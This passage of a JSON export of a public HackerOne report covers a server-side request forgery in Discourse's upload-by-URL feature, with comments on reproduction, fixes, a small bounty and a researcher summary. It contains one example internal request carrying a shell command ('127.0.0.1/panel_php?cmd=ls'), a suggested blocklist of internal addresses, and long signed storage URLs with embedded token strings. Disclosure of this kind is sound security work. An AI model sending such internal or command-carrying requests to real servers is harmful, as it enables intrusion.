5ZM48Lw97Faf%2BmTRwYynJlpTsMle9l6X4AISAwVe8d6Y3lMwIoUf05EQESF56DAXqAPPLzIguWqYse43Fu3rR0Kod4SRKI9ETYrP01wRz5xVgd2auQ8kejiA8344efyhQxkc3iBze4UukBtqzk604geJ6wyBSmoicpk9XqO8dvlhwhYEGoL4EWTozQffflzDAr6r%2FBTrqAb3yz5skpTmfiHh2mY%2FhHGiWzvhaSmhQ5tEgt4YCDEprvoxeYWkvlaxqdLXcMfRTr89qs4wuii5IpOn31c13IIFZzpa09Cs%2BExrDUX44ykH0g1zxLN374%2BwiIK3wd5v3201Stw8drFGqAKHIFBpAjuZIFF37RxSxGgAxlHskSrBBA1YzTX1SQV7r%2FcyXcvsAXO99Rr3E6FQFka96boq3PmqqeaoYxAs03IbehGcOPJ%2F3Ih7ebkxTDLG%2B75tCeMz1g%2BKNymUDx9%2B0KJfzKzXbCzi5TX8vNPGUyjZh2Y7SNRHBl7hFmGgXNktN5w%3D%3D\u0026X-Amz-Signature=0d4307c302ba7777765b25431f046eef322c0c85f67da0a7155778ce72dcb0e0"},{"id":186215,"filename":"Ruby_netcat.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/186/215/f3db2f16c0a0df29e00a3c9d0ece378f4142685b/Ruby_netcat.png?response-content-disposition=attachment%3B%20filename%3D%22Ruby_netcat.png%22%3B%20filename%2A%3DUTF-8%27%27Ruby_netcat.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQXJYPBHFQ%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T050338Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDu4%2FXsLbLXL64kN0gTqrVP%2B6YQy0aFrAsl8mmpM3A02gIhAMCTWiWTqJYsWHj2mR6ExJkLtM%2BAer5nJ1p6uJxIO04QKrQDCFQQARoMMDEzNjE5Mjc0ODQ5IgyKVAfpOTinzYsPSPkqkQMwQonGdI9p7CuN4bjSzjzCvtK%2FWWqz3YU8bTMgRxd1lvP8n%2BmQUW%2FPjx22yWgMPRHSApDfLhipeKY57Ywk6GpNSLkFsR4mWXVTUZ3fv%2BFpIecsA7FNlVffsWQFQL1hvyVhQXlfUb877oYsLHI7rvsdEl2oxxoNNBVppK7LLDUZ5Hszb5rUUqEs3JeInglYJgHEk0JqpQ59Rfq6iusCJYxnpCRnEk4ATJ3WPY0fYnF5%2BrjplwvF9jvrWA8ORsehD7OObtIyHgdE%2BeHQJDIwKM12S2Z3doq1C1frQwXKFiUX0Y9ZT6Dew0nqLavJd23CiqxMaeH6L8Dme7K0ES6LXhVDxzX5ZM48Lw97Faf%2BmTRwYynJlpTsMle9l6X4AISAwVe8d6Y3lMwIoUf05EQESF56DAXqAPPLzIguWqYse43Fu3rR0Kod4SRKI9ETYrP01wRz5xVgd2auQ8kejiA8344efyhQxkc3iBze4UukBtqzk604geJ6wyBSmoicpk9XqO8dvlhwhYEGoL4EWTozQffflzDAr6r%2FBTrqAb3yz5skpTmfiHh2mY%2FhHGiWzvhaSmhQ5tEgt4YCDEprvoxeYWkvlaxqdLXcMfRTr89qs4wuii5IpOn31c13IIFZzpa09Cs%2BExrDUX44ykH0g1zxLN374%2BwiIK3wd5v3201Stw8drFGqAKHIFBpAjuZIFF37RxSxGgAxlHskSrBBA1YzTX1SQV7r%2FcyXcvsAXO99Rr3E6FQFka96boq3PmqqeaoYxAs03IbehGcOPJ%2F3Ih7ebkxTDLG%2B75tCeMz1g%2BKNymUDx9%2B0KJfzKzXbCzi5TX8vNPGUyjZh2Y7SNRHBl7hFmGgXNktN5w%3D%3D\u0026X-Amz-Signature=9687f2daa199706f5d802c735cb5b7d53817b66b02baf356201c0de93e7b3331"},{"id":186214,"filename":"Ruby_client_prove.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/186/214/950b2cefa687af8a216f08e670ef0f112a25a707/Ruby_client_prove.png?response-content-disposition=attachment%3B%20filename%3D%22Ruby_client_prove.png%22%3B%20filename%2A%3DUTF-8%27%27Ruby_client_prove.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQXJYPBHFQ%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T050338Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDu4%2FXsLbLXL64kN0gTqrVP%2B6YQy0aFrAsl8mmpM3A02gIhAMCTWiWTqJYsWHj2mR6ExJkLtM%2BAer5nJ1p6uJxIO04QKrQDCFQQARoMMDEzNjE5Mjc0ODQ5IgyKVAfpOTinzYsPSPkqkQMwQonGdI9p7CuN4bjSzjzCvtK%2FWWqz3YU8bTMgRxd1lvP8n%2BmQUW%2FPjx22yWgMPRHSApDfLhipeKY57Ywk6GpNSLkFsR4mWXVTUZ3fv%2BFpIecsA7FNlVffsWQFQL1hvyVhQXlfUb877oYsLHI7rvsdEl2oxxoNNBVppK7LLDUZ5Hszb5rUUqEs3JeInglYJgHEk0JqpQ59Rfq6iusCJYxnpCRnEk4ATJ3WPY0fYnF5%2BrjplwvF9jvrWA8ORsehD7OObtIyHgdE%2BeHQJDIwKM12S2Z3doq1C1frQwXKFiUX0Y9ZT6Dew0nqLavJd23CiqxMaeH6L8Dme7K0ES6LXhVDxzX5ZM48Lw97Faf%2BmTRwYynJlpTsMle9l6X4AISAwVe8d6Y3lMwIoUf05EQESF56DAXqAPPLzIguWqYse43Fu3rR0Kod4SRKI9ETYrP01wRz5xVgd2auQ8kejiA8344efyhQxkc3iBze4UukBtqzk604geJ6wyBSmoicpk9XqO8dvlhwhYEGoL4EWTozQffflzDAr6r%2FBTrqAb3yz5skpTmfiHh2mY%2FhHGiWzvhaSmhQ5tEgt4YCDEprvoxeYWkvlaxqdLXcMfRTr89qs4wuii5IpOn31c13IIFZzpa09Cs%2BExrDUX44ykH0g1zxLN374%2BwiIK3wd5v3201Stw8drFGqAKHIFBpAjuZIFF37RxSxGgAxlHskSrBBA1YzTX1SQV7r%2FcyXcvsAXO99Rr3E6FQFka96boq3PmqqeaoYxAs03IbehGcOPJ%2F3Ih7ebkxTDLG%2B75tCeMz1g%2BKNymUDx9%2B0KJfzKzXbCzi5TX8vNPGUyjZh2Y7SNRHBl7hFmGgXNktN5w%3D%3D\u0026X-Amz-Signature=483f846af917fc2bd8ec6760c143ce15fc819a66e8faacb6dbed0fb27f82f9e7"}],"genius_execution_id":null,"team_handle":"discourse","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1687105,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks I was able to reproduce the crawling of the FTP protocol. Looking into it.","markdown_message":"\u003cp\u003eThanks I was able to reproduce the crawling of the FTP protocol. Looking into it.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-05-19T20:50:32.480Z","updated_at":"2017-05-19T20:50:32.480Z","actor":{"username":"discourse_team","cleared":false,"url":"/discourse_team","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/130/970/7a0cbe82b76df13bcdbf07365f42abe856650525_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"discourse","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1687160,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Np, notice that the exploitation is a bit tricky, as if u will use the same filename as i said before the requests will be sent only via the first client, the ruby client will only send a request if the \"uploaded\" file is a new file and for a first time asked.\n\nWaiting for your response, cheers.","markdown_message":"\u003cp\u003eNp, notice that the exploitation is a bit tricky, as if u will use the same filename as i said before the requests will be sent only via the first client, the ruby client will only send a request if the \u0026quot;uploaded\u0026quot; file is a new file and for a first time asked.\u003c/p\u003e\n\n\u003cp\u003eWaiting for your response, cheers.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-05-19T21:19:54.405Z","updated_at":"2017-05-19T21:19:54.405Z","actor":{"username":"mariuszpoplawski","cleared":false,"url":"/mariuszpoplawski","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/43BtUKfowdJ8ZD7ZW4o2fnfM/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"discourse","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1687174,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"We've fixed the ftp/gopher issue but are brainstorming how to resolve the HTTP issue properly. ","markdown_message":"\u003cp\u003eWe\u0026#39;ve fixed the ftp/gopher issue but are brainstorming how to resolve the HTTP issue properly. \u003c/p\u003e\n","automated_response":false,"created_at":"2017-05-19T21:23:20.590Z","updated_at":"2017-05-19T21:23:20.590Z","actor":{"username":"discourse_team","cleared":false,"url":"/discourse_team","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/130/970/7a0cbe82b76df13bcdbf07365f42abe856650525_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"discourse","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1687187,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hay, \n\nJust do like i said, check if sent message responded with response \"200\" which is a vliad, if the  malicious server will try to redirect the response will be 302 and if it will be not the \"200\" code then shoutdown the fucntion. Second check if the response is \"200\" then check if the valid request is a image by scraping the content of the response.","markdown_message":"\u003cp\u003eHay, \u003c/p\u003e\n\n\u003cp\u003eJust do like i said, check if sent message responded with response \u0026quot;200\u0026quot; which is a vliad, if the  malicious server will try to redirect the response will be 302 and if it will be not the \u0026quot;200\u0026quot; code then shoutdown the fucntion. Second check if the response is \u0026quot;200\u0026quot; then check if the valid request is a image by scraping the content of the response.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-05-19T21:28:09.446Z","updated_at":"2017-05-19T21:28:09.446Z","actor":{"username":"mariuszpoplawski","cleared":false,"url":"/mariuszpoplawski","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/43BtUKfowdJ8ZD7ZW4o2fnfM/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"discourse","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1687199,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Also you can block all adress that contains a local IP: for example make a blacklist and check the \"domain\" after protocol for example:\n\nif user will submit http://127.0.0.1/panel_php?cmd=ls\n\ncheck if the part of link after protocol ://HERE/ is not on blacklist.\n\nOn blacklist should be all possibilities  that will block the request to internal resources:\n- 127.0.0.1\n- 0.0.0.0\n- localhost\n- All IP of yoiur servers and API's (including 64.71.168.198, 64.71.168.206 etc...)\n\n\nAlso you can check if the requested link have a valid content type for example create a whitelist:\n\n$extensionMap = [\n    'gif'  =\u003e 'image/gif',\n    'png'  =\u003e 'image/png',\n    'jpg'  =\u003e 'image/jpeg',\n    'jpeg' =\u003e 'image/jpeg'\n];\n\n\nYou can read an example here:\n\nhttps://whitton.io/articles/safecurl-ssrf-protection-and-a-capture-the-bitcoins/\nhttp://stackoverflow.com/questions/35896093/how-can-i-prevent-ssrf-via-pathinfo-passing-a-url-in-php\n\n\nps. i can confirm of fixed issue with other protocol just tested.","markdown_message":"\u003cp\u003eAlso you can block all adress that contains a local IP: for example make a blacklist and check the \u0026quot;domain\u0026quot; after protocol for example:\u003c/p\u003e\n\n\u003cp\u003eif user will submit \u003ca title=\"http://127.0.0.1/panel_php?cmd=ls\" href=\"/redirect?url=http%3A%2F%2F127.0.0.1%2Fpanel_php%3Fcmd%3Dls\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://127.0.0.1/panel_php?cmd=ls\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003echeck if the part of link after protocol ://HERE/ is not on blacklist.\u003c/p\u003e\n\n\u003cp\u003eOn blacklist should be all possibilities  that will block the request to internal resources:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003e127.0.0.1\u003c/li\u003e\n\u003cli\u003e0.0.0.0\u003c/li\u003e\n\u003cli\u003elocalhost\u003c/li\u003e\n\u003cli\u003eAll IP of yoiur servers and API\u0026#39;s (including 64.71.168.198, 64.71.168.206 etc...)\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eAlso you can check if the requested link have a valid content type for example create a whitelist:\u003c/p\u003e\n\n\u003cp\u003e$extensionMap = [\u003cbr\u003e\n    \u0026#39;gif\u0026#39;  =\u0026gt; \u0026#39;image/gif\u0026#39;,\u003cbr\u003e\n    \u0026#39;png\u0026#39;  =\u0026gt; \u0026#39;image/png\u0026#39;,\u003cbr\u003e\n    \u0026#39;jpg\u0026#39;  =\u0026gt; \u0026#39;image/jpeg\u0026#39;,\u003cbr\u003e\n    \u0026#39;jpeg\u0026#39; =\u0026gt; \u0026#39;image/jpeg\u0026#39;\u003cbr\u003e\n];\u003c/p\u003e\n\n\u003cp\u003eYou can read an example here:\u003c/p\u003e\n\n\u003cp\u003e\u003ca title=\"https://whitton.io/articles/safecurl-ssrf-protection-and-a-capture-the-bitcoins/\" href=\"/redirect?url=https%3A%2F%2Fwhitton.io%2Farticles%2Fsafecurl-ssrf-protection-and-a-capture-the-bitcoins%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://whitton.io/articles/safecurl-ssrf-protection-and-a-capture-the-bitcoins/\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003cbr\u003e\n\u003ca title=\"http://stackoverflow.com/questions/35896093/how-can-i-prevent-ssrf-via-pathinfo-passing-a-url-in-php\" href=\"/redirect?url=http%3A%2F%2Fstackoverflow.com%2Fquestions%2F35896093%2Fhow-can-i-prevent-ssrf-via-pathinfo-passing-a-url-in-php\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://stackoverflow.com/questions/35896093/how-can-i-prevent-ssrf-via-pathinfo-passing-a-url-in-php\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eps. i can confirm of fixed issue with other protocol just tested.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-05-19T21:33:02.050Z","updated_at":"2017-05-19T21:47:59.262Z","actor":{"username":"mariuszpoplawski","cleared":false,"url":"/mariuszpoplawski","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/43BtUKfowdJ8ZD7ZW4o2fnfM/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"discourse","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1687222,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2017-05-19T21:50:34.237Z","updated_at":"2017-05-19T21:50:34.237Z","additional_data":{"old_severity":"Medium","new_severity":"Low","old_severity_id":42059,"new_severity_id":43431},"actor":{"username":"discourse_team","cleared":false,"url":"/discourse_team","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/130/970/7a0cbe82b76df13bcdbf07365f42abe856650525_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"discourse","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1687223,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"thanks, we don't consider this much of an exploit, but good to patch on principle.","markdown_message":"\u003cp\u003ethanks, we don\u0026#39;t consider this much of an exploit, but good to patch on principle.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-05-19T21:51:10.415Z","updated_at":"2017-05-19T21:51:10.415Z","actor":{"url":"/discourse","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/016/893/0bc08a2076b0f1f4a2c58636b8171b32cc367a52_original./eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Discourse"}},"bounty_amount":"64.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"discourse","collaborator":{"username":"mariuszpoplawski","url":"/mariuszpoplawski"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1687225,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","markdown_message":"","automated_response":false,"created_at":"2017-05-19T21:51:27.054Z","updated_at":"2017-05-19T21:51:27.054Z","actor":{"username":"discourse_team","cleared":false,"url":"/discourse_team","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/130/970/7a0cbe82b76df13bcdbf07365f42abe856650525_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"mariuszpoplawski","url":"/mariuszpoplawski"},"genius_execution_id":null,"team_handle":"discourse","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1687229,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"The impact in our opinion is  more dangerous as this impact internal resources. you can for example check how much other programs pay for this kind of issue, but thanks for the bounty...\n\nCan we make the report public after with only summary? as there is my server IP address information.\n\nCheers.","markdown_message":"\u003cp\u003eThe impact in our opinion is  more dangerous as this impact internal resources. you can for example check how much other programs pay for this kind of issue, but thanks for the bounty...\u003c/p\u003e\n\n\u003cp\u003eCan we make the report public after with only summary? as there is my server IP address information.\u003c/p\u003e\n\n\u003cp\u003eCheers.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-05-19T21:54:41.580Z","updated_at":"2017-05-19T21:54:41.580Z","actor":{"username":"mariuszpoplawski","cleared":false,"url":"/mariuszpoplawski","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/43BtUKfowdJ8ZD7ZW4o2fnfM/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"discourse","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1687230,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Before disclosure  please remove all sensitive infrmation or disclosure only the summary.. \n\nRegards afine.pl team","markdown_message":"\u003cp\u003eBefore disclosure  please remove all sensitive infrmation or disclosure only the summary.. \u003c/p\u003e\n\n\u003cp\u003eRegards afine.pl team\u003c/p\u003e\n","automated_response":false,"created_at":"2017-05-19T21:55:49.158Z","updated_at":"2017-05-19T21:55:49.158Z","first_to_agree":true,"actor":{"username":"mariuszpoplawski","cleared":false,"url":"/mariuszpoplawski","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/43BtUKfowdJ8ZD7ZW4o2fnfM/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"discourse","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1764218,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-06-18T21:55:53.089Z","updated_at":"2017-06-18T21:55:53.089Z","actor":{"url":"/discourse","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/016/893/0bc08a2076b0f1f4a2c58636b8171b32cc367a52_original./eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Discourse"}},"genius_execution_id":null,"team_handle":"discourse","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"id":4097,"category":"researcher","content":"The discourse.org upload function through URL in message content was vulnerable to Server side request forgery. Attacker was able to send internal / external requests using 2 different  client used by discourse.org including Ruby client. As an example we showed requests to ftp:// resources. I consider the vulnerability more risky then discourse.org team because the remote users should not be allow to send internal server side requests.","can_view?":true,"can_edit?":false,"content_html":"\u003cp\u003eThe discourse.org upload function through URL in message content was vulnerable to Server side request forgery. Attacker was able to send internal / external requests using 2 different  client used by discourse.org including Ruby client. As an example we showed requests to ftp:// resources. I consider the vulnerability more risky then discourse.org team because the remote users should not be allow to send internal server side requests.\u003c/p\u003e\n"}]}